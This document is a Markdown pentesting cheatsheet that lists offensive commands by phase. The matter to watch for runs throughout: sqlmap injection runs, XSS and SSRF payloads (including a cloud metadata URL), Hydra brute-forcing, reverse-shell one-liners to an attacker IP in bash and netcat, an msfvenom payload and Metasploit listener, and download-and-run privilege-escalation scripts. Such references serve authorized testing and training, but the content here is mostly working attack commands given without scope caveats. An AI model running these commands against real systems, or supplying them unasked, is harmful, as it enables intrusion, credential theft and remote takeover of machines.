# Golden Pentesting Commands & Cheatsheet

## Purpose

A complete, all-in-one pentesting reference guide containing the most essential and advanced commands used in real-world offensive security operations. Designed for daily use, interviews, GitHub uploads, and educational references.

---

## Table of Contents

- [Scanning and Enumeration](#scanning-and-enumeration)
- [Web Application Attacks](#web-application-attacks)
- [Password Cracking and Brute Force](#password-cracking-and-brute-force)
- [Shells and Post-Exploitation](#shells-and-post-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Useful Enumeration Commands](#useful-enumeration-commands)
- [Reporting and Documentation](#reporting-and-documentation)
- [Common Ports Cheat Sheet](#common-ports-cheat-sheet)
- [Tools to Always Carry](#tools-to-always-carry)

---

## Scanning and Enumeration

### Nmap (Full Power Scanning)

```bash
nmap -sS -sC -sV -O -A -T4 -p- --open -oA fullscan example.com
nmap --script vuln example.com
nmap --top-ports 1000 -T4 example.com
```

**When to Use:**
- Full recon, finding services, OS detection, vulnerability finding.

### Masscan (Fastest Port Scanner)

```bash
masscan -p1-65535 10.10.10.0/24 --rate=10000 -e tun0
```

**When to Use:**
- Huge IP ranges with speed.

### Rustscan (Next-gen Nmap)

```bash
rustscan -a 10.10.10.10 --ulimit 5000 -- -sC -sV
```

**When to Use:**
- Quick service enumeration, combine with Nmap.

---

## Web Application Attacks

### SQL Injection Testing

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --risk=3 --level=5 --dbs
sqlmap -r request.txt --batch --risk=3 --level=5 --technique=BEUSTQ
```

### XSS Testing

```html
<script>alert(1)</script>
<svg onload=alert(1)>
"><img src=x onerror=alert(1)>
```

**XSS Payloads:**
- DOM-based, Reflected, Stored XSS
- Bypass WAF payloads, URI encoded payloads

### SSRF Testing

```bash
http://127.0.0.1:80
http://localhost/admin
http://169.254.169.254/latest/meta-data/
```

**When to Use:**
- Check file uploads, URL fetchers, PDF generators.

### File Upload Attacks

- `shell.php.jpg`
- Content-Type Tampering
- SVG/XHTML Payload Upload

---

## Password Cracking and Brute Force

### Hydra (Online Cracking)

```bash
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l admin -P rockyou.txt ftp://target.com -V
```

### John the Ripper (Offline Cracking)

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Hashcat (GPU Power Cracking)

```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

**Common Hash Modes:**
- `0` - MD5
- `100` - SHA1
- `500` - MD5 Crypt
- `1800` - SHA512 Crypt

---

## Shells and Post-Exploitation

### Linux Reverse Shell

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

### Windows Reverse Shell

```bash
nc.exe -e cmd.exe 10.10.10.10 4444
```

### Generating Payloads

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```

**Listener (Metasploit):**

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

---

## Privilege Escalation

### Linux Privilege Escalation

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Use **LinPEAS**

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Windows Privilege Escalation

Use **WinPEAS**

```bash
winPEASany.exe
```

**Manual Commands:**

```cmd
whoami /priv
systeminfo
net users
```

---

## Useful Enumeration Commands

### Linux

```bash
id
whoami
uname -a
ps aux
ss -tulnp
```

### Windows

```cmd
ipconfig /all
netstat -ano
systeminfo
whoami /all
```

---

## Reporting and Documentation

- **Take screenshots**: Burp Suite, Browser, Terminal
- **Save evidence**: request/responses, shell outputs
- **Document vulnerabilities:**
  - Title
  - Description
  - Impact
  - Steps to Reproduce
  - Remediation

---

## Common Ports Cheat Sheet

| Port  | Service                  |
|------ |---------------------------|
| 20,21 | FTP                       |
| 22    | SSH                       |
| 23    | Telnet                    |
| 25    | SMTP                      |
| 53    | DNS                       |
| 67,68 | DHCP                      |
| 69    | TFTP                      |
| 80    | HTTP                      |
| 110   | POP3                      |
| 111   | RPCBind                   |
| 123   | NTP                       |
| 135   | MS RPC                    |
| 137-139 | NetBIOS                 |
| 143   | IMAP                      |
| 161/162 | SNMP                    |
| 389   | LDAP                      |
| 443   | HTTPS                     |
| 445   | SMB                       |
| 514   | Syslog                    |
| 543/544 | Kerberos                 |
| 587   | SMTP (submission)          |
| 631   | IPP (Printing)             |
| 993   | IMAPS                     |
| 995   | POP3S                     |
| 1433  | MSSQL Server               |
| 1521  | Oracle Database            |
| 2049  | NFS                       |
| 2375  | Docker Remote API          |
| 3306  | MySQL                     |
| 3389  | RDP                       |
| 3690  | SVN                       |
| 4444  | Metasploit                 |
| 5432  | PostgreSQL                |
| 5900  | VNC                       |
| 6379  | Redis                     |
| 8000  | Common Dev HTTP Port       |
| 8080  | HTTP Proxy                 |
| 8443  | HTTPS-Alt                 |
| 9000  | SonarQube                 |
| 9200  | Elasticsearch             |
| 11211 | Memcached                 |

---

## Tools to Always Carry

| Purpose               | Tools                               |
|---------------------- |------------------------------------|
| Scanning              | Nmap, Masscan, Rustscan            |
| Web App Testing       | Burp Suite Pro, OWASP ZAP, sqlmap  |
| Password Attacks      | Hydra, John, Hashcat               |
| Privilege Escalation  | LinPEAS, WinPEAS, PowerUp          |
| Enumeration           | enum4linux, smbclient, snmpwalk   |
| Exploitation          | Metasploit, msfvenom               |
| Wordlists             | SecLists, FuzzDB                   |
| Reporting             | Markdown, Notion, CherryTree      |

---

**End of Cheatsheet **

---

## Notes

- Always scan stealthily if needed (`-T1` slow timing)
- Always verify results manually
- Always document everything cleanly for reporting

